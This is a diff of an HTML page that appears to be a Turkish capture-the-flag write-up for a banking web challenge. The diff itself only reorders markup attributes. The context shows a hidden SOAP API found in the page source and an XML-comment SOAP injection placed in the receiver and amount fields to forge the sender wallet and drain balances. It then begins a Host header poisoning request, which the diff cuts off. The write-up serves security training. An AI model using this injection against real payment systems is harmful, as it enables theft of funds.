@@ -54,7 +54,7 @@
 <p>Uye olundugunda <strong>For developers</strong> adinda daha aktif olmayan bir karsimiza cikiyor.
 <img src="2.png" alt="" /></p>
 <p>Fakat kaynak kodunda assagidaki ifadeleri gozlemleyebiliyoruz.</p>
-<pre style="background-color:#fdf6e3;" lang="html"><code>
+<pre lang="html" style="background-color:#fdf6e3;"><code>
 <span style="color:#657b83;">      </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">div </span><span style="color:#b58900;">class</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">tab tab_5</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">Especially for pig-developers, we have the coolest api, which they will soon be able to use!</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">div</span><span style="color:#93a1a1;">&gt;
 </span><span style="color:#657b83;">      </span><span style="color:#93a1a1;">&lt;!-- Link to the API (http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php) (Testing stage) --&gt;
 </span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">div</span><span style="color:#93a1a1;">&gt;
@@ -156,7 +156,7 @@
 </span>
 </code></pre>
 <p>Ilk kosul(bakiye yollama) icin api token'e ihtiyac duyuyoruz. Buyuk ihtimal sorunun cozumu de bununla alakali olacagindan dolayi bunu kurcalamayabiliriz.</p>
-<pre style="background-color:#fdf6e3;" lang="http"><code>
+<pre lang="http" style="background-color:#fdf6e3;"><code>
 <span style="color:#657b83;">POST /home/transfer.php HTTP/1.1
 </span><span style="color:#657b83;">Host: web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one
 </span><span style="color:#657b83;">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
@@ -177,7 +177,7 @@
 <p>Istekte giden parametreler arasinda <code>receiver</code> ve <code>amount</code> olmasi bir once gordugumuz bakiye yollama endpointi ile tutuyordu. Bundan dolayi <code>SOAP injection</code> denenebilir.</p>
 <h3>Çözüm 1: SOAP injection</h3>
 <p>Aklimizda olsuturdugumuz hedeflenen injection assagida gorunmektedir:</p>
-<pre style="background-color:#fdf6e3;" lang="xml"><code>
+<pre lang="xml" style="background-color:#fdf6e3;"><code>
 <span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">receiver_wallet_num </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:decimal</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">1828</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">receiver_wallet_num</span><span style="color:#93a1a1;">&gt;
 </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">sender_wallet_num </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:decimal</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">1</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">sender_wallet_num</span><span style="color:#93a1a1;">&gt;
 </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">amount </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:float</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;&lt;!--&lt;/receiver_wallet_num&gt;
@@ -187,21 +187,21 @@
 </span>
 </code></pre>
 <p><strong>receiver</strong> kısmına;</p>
-<pre style="background-color:#fdf6e3;" lang="xml"><code>
+<pre lang="xml" style="background-color:#fdf6e3;"><code>
 <span style="color:#657b83;">hesapNumaram </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">receiver_wallet_num</span><span style="color:#93a1a1;">&gt;
 </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">sender_wallet_num </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:decimal</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">1</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">sender_wallet_num</span><span style="color:#93a1a1;">&gt;
 </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">amount </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:float</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;&lt;!--
 </span>
 </code></pre>
 <p><strong>amount</strong> kısmına ise;</p>
-<pre style="background-color:#fdf6e3;" lang="xml"><code>
+<pre lang="xml" style="background-color:#fdf6e3;"><code>
 <span style="color:#657b83;">--&gt; 200
 </span>
 </code></pre>
 <p>Fakat nedense hesabimiza paralar yuklenmedi. Sonra dusununce hedefte yeterince para olmayabilir. Bundan dolayi belli bir aralikta ki herkesin bakiyesini calmaya calistik.</p>
 <p><img src="3.png" alt="" /></p>
 <h3>Çözüm 2: Host header poisoning</h3>
-<pre lang="http" style="background-color:#fdf6e3;"><code>
+<pre style="background-color:#fdf6e3;" lang="http"><code>
 <span style="color:#657b83;">POST /home/transfer.php HTTP/1.1
 </span><span style="color:#657b83;">Host: web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one
 </span><span style="color:#657b83;">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
